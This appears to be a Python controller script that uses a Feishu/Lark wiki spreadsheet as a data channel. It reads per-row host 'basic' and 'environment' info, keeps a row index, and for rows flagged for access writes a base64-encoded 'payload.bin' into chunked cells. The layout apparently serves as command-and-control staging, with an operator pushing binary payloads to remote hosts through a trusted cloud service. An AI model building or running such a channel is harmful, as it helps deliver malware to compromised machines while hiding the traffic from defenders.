import json
import requests
import time
import base64
import os


import lark_oapi as lark
from lark_oapi.api.wiki.v2 import *
from lark_oapi.api.sheets.v3 import *
from lark_oapi.api.auth.v3 import *
from lark_oapi.api.drive.v1 import *

appid = os.getenv("APP_ID")
app_secret = os.getenv("APP_SECRET")
wikitoken = os.getenv("WIKI_TOKEN")

client = lark.Client.builder() \
    .app_id(appid) \
    .app_secret(app_secret) \
    .log_level(lark.LogLevel.DEBUG) \
    .build()

def fetch_spreadsheet_token(token):
    request: GetNodeSpaceRequest = GetNodeSpaceRequest.builder() \
        .token(token) \
        .obj_type("wiki") \
        .build()

    # 发起请求
    response: GetNodeSpaceResponse = client.wiki.v2.space.get_node(request)

    # 处理失败返回
    if not response.success():
        lark.logger.error(
            f"client.wiki.v2.space.get_node failed, code: {response.code}, msg: {response.msg}, log_id: {response.get_log_id()}, resp: \n{json.dumps(json.loads(response.raw.content), indent=4, ensure_ascii=False)}")
        return

    # 处理业务结果
    lark.logger.info(lark.JSON.marshal(response.data, indent=4))
    return json.loads(lark.JSON.marshal(response.data, indent=4))["node"]["obj_token"]

def fetch_sheet_id(spreadsheet_token):
    request: QuerySpreadsheetSheetRequest = QuerySpreadsheetSheetRequest.builder() \
        .spreadsheet_token(spreadsheet_token) \
        .build()

    # 发起请求
    response: QuerySpreadsheetSheetResponse = client.sheets.v3.spreadsheet_sheet.query(request)

    # 处理失败返回
    if not response.success():
        lark.logger.error(
            f"client.sheets.v3.spreadsheet_sheet.query failed, code: {response.code}, msg: {response.msg}, log_id: {response.get_log_id()}, resp: \n{json.dumps(json.loads(response.raw.content), indent=4, ensure_ascii=False)}")
        return

    # 处理业务结果
    lark.logger.info(lark.JSON.marshal(response.data, indent=4))
    return json.loads(lark.JSON.marshal(response.data, indent=4))["sheets"][0]["sheet_id"]

def fetch_tenant_access_token():
    request: InternalTenantAccessTokenRequest = InternalTenantAccessTokenRequest.builder() \
        .request_body(InternalTenantAccessTokenRequestBody.builder()
            .app_id(appid)
            .app_secret(app_secret)
            .build()) \
        .build()

    # 发起请求
    response: InternalTenantAccessTokenResponse = client.auth.v3.tenant_access_token.internal(request)

    # 处理失败返回
    if not response.success():
        lark.logger.error(
            f"client.auth.v3.tenant_access_token.internal failed, code: {response.code}, msg: {response.msg}, log_id: {response.get_log_id()}, resp: \n{json.dumps(json.loads(response.raw.content), indent=4, ensure_ascii=False)}")
        return

    return json.loads(response.raw.content.decode())["tenant_access_token"]

spreadsheet_token = fetch_spreadsheet_token(wikitoken)
sheet_id = fetch_sheet_id(spreadsheet_token)

def _insert_data(data):
    url = f"https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/{spreadsheet_token}/values"
    headers = {
        "Authorization": "Bearer " + fetch_tenant_access_token(),
        "Content-Type": "application/json"
    }
    res = requests.put(url,headers=headers,data=json.dumps(data))

    if res.status_code != 200:
        print(res.text)
    else:
        print(res.text)


def split_payload(payload):
    length = (len(payload) + 39999) // 40000  
    payloads = [payload[i * 40000:(i + 1) * 40000] for i in range(length)]
    return payloads


def _insert_payload(index, is_access, payload):
    if payload is not None:
        payloads = split_payload(payload)
        
        values = []
        values.append(str(is_access))
        for i in range(len(payloads)):
            values.append(payloads[i])
        

    else:
        values = [str(is_access), None]

    data = {
        "valueRange": {
            "range": f"{sheet_id}!O{index}:AO20",
            "values": [values]
        }
    }   
    _insert_data(data)

def insert_payload(index, is_access):
    if is_access:
        with open("payload.bin", "rb") as f:
            payload = f.read()
            bass64_payload = base64.b64encode(payload).decode()
            _insert_payload(index, is_access, bass64_payload)
    else:
        _insert_payload(index, is_access, None)

def claer_table():
    data = {
        "valueRange": {
            "range": f"{sheet_id}!A2:AO20",
            "values": [[None] * 32 for _ in range(19)] 
        }
    }   
    url = f"https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/{spreadsheet_token}/values"
    headers = {
        "Authorization": "Bearer " + fetch_tenant_access_token(),
        "Content-Type": "application/json"
    }
    res = requests.put(url,headers=headers,data=json.dumps(data))

    if res.status_code != 200:
        print(res.text)
    else:
        print(res.text)



# 其实调用过一次就行了
def initialize():
    # 构造请求对象
    request: SubscribeFileRequest = SubscribeFileRequest.builder() \
        .file_token(spreadsheet_token) \
        .file_type("sheet") \
        .build()

    # 发起请求
    response: SubscribeFileResponse = client.drive.v1.file.subscribe(request)

    # 处理失败返回
    if not response.success():
        lark.logger.error(
            f"client.drive.v1.file.subscribe failed, code: {response.code}, msg: {response.msg}, log_id: {response.get_log_id()}, resp: \n{json.dumps(json.loads(response.raw.content), indent=4, ensure_ascii=False)}")
        return

    print(response.msg)

def _fetch_data(table_range:str) -> json:
    url = f"https://open.feishu.cn/open-apis/sheets/v2/spreadsheets/{spreadsheet_token}/values/{sheet_id}!{table_range}"
    headers = {
        "Authorization": "Bearer " + fetch_tenant_access_token(),
    }
    res = requests.get(url,headers=headers)

    if res.status_code == 200:
        print(res.json())
        return res.json()["data"]["valueRange"]["values"]
    else:
        print(res.text)


def fetch_data_basic_info(index) -> json:
    return _fetch_data(f"A{index}:E{index}")

def fetch_data_env_info(index) -> json:
    return _fetch_data(f"G{index}:L{index}")

def fetch_data_index():
    data = _fetch_data("A51:A51")

    return data[0][0]

def reset_index():
    data = {
        "valueRange": {
            "range": f"{sheet_id}!A51:A51",
            "values": [[2]]
        }
    }   
    _insert_data(data)